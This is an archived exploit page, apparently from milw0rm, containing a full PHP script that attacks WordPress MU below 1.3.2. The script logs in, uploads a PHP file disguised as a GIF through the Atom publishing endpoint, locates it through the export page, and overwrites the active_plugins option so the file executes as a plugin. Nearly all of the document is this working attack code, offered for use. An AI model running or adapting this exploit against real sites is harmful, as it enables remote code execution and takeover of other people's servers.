<html><head><title>Wordpress MU < 1.3.2 active_plugins option Code Execution Exploit</title></head><pre>&lt;?php
/*
WordPress [MU] blog's options overwrite

Credits : Alexander Concha &lt;alex at buayacorp dot com&gt;
Website : http://www.buayacorp.com/
Advisory: http://www.buayacorp.com/files/wordpress/wordpress-mu-options-overwrite.html

This exploit uses active_plugins option to execute arbitrary PHP
*/
include_once './class-snoopy.php';

// Fix Snoopy
class SnoopyExt extends Snoopy {
	function _prepare_post_body($formvars, $formfiles) {
		if ( is_string($formvars) ) {
			return $formvars;
		}
		return parent::_prepare_post_body($formvars, $formfiles);
	}
}

set_time_limit( 0 );

// Any user with 'manage_options' and 'upload_files' capabilities
$user = 'user';
$pass = '1234';
$blog_url = 'http://localhost.localdomain/mu/';
$remote_file = ''; // relative path to wp-content
$local_file = ''; // the contents of this file, if any, will be uploaded

$snoopy = new SnoopyExt();

$snoopy-&gt;maxredirs = 0;
$snoopy-&gt;cookies['wordpress_test_cookie'] = 'WP+Cookie+check';
$snoopy-&gt;submit(&quot;{$blog_url}wp-login.php&quot;, array('log' =&gt; $user, 'pwd' =&gt; $pass));

$snoopy-&gt;setcookies(); // Set auth cookies for future requests

if ( empty($remote_file) ) {
	// Upload a new file
	$snoopy-&gt;_submit_type = 'image/gif';
	$snoopy-&gt;submit(&quot;{$blog_url}wp-app.php?action=/attachments&quot;, get_contents());

	if ( preg_match('#&lt;id&gt;([^&lt;]+)&lt;/id&gt;#i', $snoopy-&gt;results, $match) ) {
		$remote_file = basename($match[1]);
	}
}
if ( empty($remote_file) ) die('Exploit failed...');

// Look for real path
$snoopy-&gt;fetch(&quot;{$blog_url}wp-admin/export.php?download&quot;);

if ( preg_match(&quot;#&lt;wp:meta_value&gt;(.*$remote_file)&lt;/wp:meta_value&gt;#&quot;, $snoopy-&gt;results, $match) ) {
	$remote_file = preg_replace('#.*?wp-content#', '', $match[1]);
}
if ( empty($remote_file) ) die('Exploit failed...');

// It asumes that file uploads are stored within wp-content 
$remote_file = '../' . ltrim($remote_file, '/');

$snoopy-&gt;fetch(&quot;{$blog_url}wp-admin/plugins.php&quot;);

// Recover previous active plugins
$active_plugins = array();
if ( preg_match_all('#action=deactivate&amp;([^\']+)#', $snoopy-&gt;results, $matches) ) {
	foreach ($matches[0] as $plugin) {
		if ( preg_match('#plugin=([^&amp;]+)#', $plugin, $match) )
			$active_plugins[] = urldecode($match[1]);
	}
	print_r($active_plugins);
}
$active_plugins[] = $remote_file;

// Fetch a valid nonce
$snoopy-&gt;fetch(&quot;{$blog_url}wp-admin/options-general.php&quot;);

if ( preg_match('#name=._wpnonce. value=.([a-z\d]{10}).#', $snoopy-&gt;results, $match) ) {

	// Finally update active_plugins
	$snoopy-&gt;set_submit_normal();
	$snoopy-&gt;submit(&quot;{$blog_url}wp-admin/options.php&quot;,
		array(
			'active_plugins' =&gt; $active_plugins,
			'_wpnonce' =&gt; $match[1],
			'action' =&gt; 'update',
			'page_options' =&gt; 'active_plugins',
		));
}

function get_contents() {
	global $local_file;

	return file_exists($local_file) ? file_get_contents($local_file) : '&lt;?php echo &quot;Hello World &quot; . __FILE__; ?&gt;';
}
?&gt;

# milw0rm.com [2008-02-05]</pre></html>